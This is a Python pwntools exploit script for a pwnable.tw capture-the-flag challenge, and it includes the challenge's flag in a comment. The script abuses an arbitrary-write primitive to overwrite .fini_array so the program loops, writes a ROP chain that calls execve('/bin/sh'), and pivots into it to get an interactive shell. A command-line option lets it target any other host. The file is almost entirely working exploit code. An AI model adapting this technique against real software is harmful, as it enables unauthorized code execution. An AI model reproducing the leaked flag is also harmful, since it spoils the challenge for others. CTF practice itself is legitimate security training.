from pwn import *
import sys

port = 10105
#FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}

def send_data(s, addr,data):
    s.recvuntil('addr:')
    s.sendline(str(addr))
    s.recvuntil('data:')
    s.send(data)

def exploit(s):
    fini_array_addr = 0x00000000004B40F0
    main_addr = 0x0000000000401B6D
    loop_func_addr = 0x0000000000402960
    main_leave_ret_addr = 0x0000000000401C4B

    #change .fini.array[1] = main_addr,.fini.array[0] = loop_func_addr
    send_data(s, fini_array_addr,p64(loop_func_addr)+p64(main_addr))
    print ('change .fini.array')
    #rop
    pop_eax_addr = 0x000000000041e4af
    pop_edi_addr = 0x0000000000401696
    pop_esi_addr = 0x0000000000406c30
    pop_edx_addr = 0x0000000000446e35
    syscall_addr = 0x0000000000471db5
    binsh_addr = 0x00000000004B4080
    start_addr = 0x00000000004B4100
    sys_read_addr = 0x0000000000446E2C

    send_data(s, start_addr,p64(pop_eax_addr)+p64(0x3b))
    send_data(s, start_addr+16,p64(pop_edi_addr)+p64(binsh_addr))
    send_data(s, binsh_addr,"/bin/sh\x00")

    send_data(s, start_addr+32,p64(pop_esi_addr)+p64(0))
    send_data(s, start_addr+48,p64(pop_edx_addr)+p64(0))
    send_data(s, start_addr+64,p64(syscall_addr))
    send_data(s, fini_array_addr,p64(main_leave_ret_addr))
    s.interactive()

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = remote('chall.pwnable.tw', port)
        exploit(s)

    else:
        s = remote(sys.argv[1], 1346)
        input('PAUSED')
        exploit(s)
